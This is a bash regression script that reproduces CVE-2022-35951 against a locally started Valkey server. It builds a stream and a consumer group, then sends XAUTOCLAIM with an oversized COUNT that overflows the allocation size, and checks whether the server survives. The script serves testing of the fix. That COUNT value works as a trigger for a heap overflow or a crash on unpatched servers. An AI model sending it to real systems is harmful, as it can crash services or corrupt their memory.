#!/bin/bash
# Reproducer for CVE-2022-35951: XAUTOCLAIM COUNT overflow.
#
# Before the fix, XAUTOCLAIM's COUNT argument is only checked to be in
# [1, LONG_MAX]. A large-but-in-range COUNT makes `count * sizeof(streamID)`
# (the allocation size for deleted_ids) and `count * attempts_factor`
# (the attempts counter) overflow, leading to a too-small allocation and
# a subsequent heap overflow / crash. The fix caps COUNT so the command
# instead replies with an error.
set -u

"$VALKEY_SERVER" --port "$PORT" --save "" --appendonly no --dir . \
    --enable-debug-command yes --logfile s.log &
SRV_PID=$!

for i in $(seq 1 50); do
    "$VALKEY_CLI" -p "$PORT" ping >/dev/null 2>&1 && break
    sleep 0.1
done

CLI() { "$VALKEY_CLI" -p "$PORT" "$@"; }

CLI XADD x '1-0' f v >/dev/null
CLI XGROUP CREATE x grp 0 >/dev/null
CLI XREADGROUP GROUP grp Alice STREAMS x '>' >/dev/null

echo "XAUTOCLAIM reply:"
CLI XAUTOCLAIM x grp Bob 0 '0-0' COUNT 8070450532247928833

# Confirm the server is still alive and responsive after the command.
echo "ping after:"
CLI ping

CLI shutdown nosave >/dev/null 2>&1
wait "$SRV_PID" 2>/dev/null

if grep -q "ASSERTION FAILED" s.log; then
    echo ASSERTION
fi
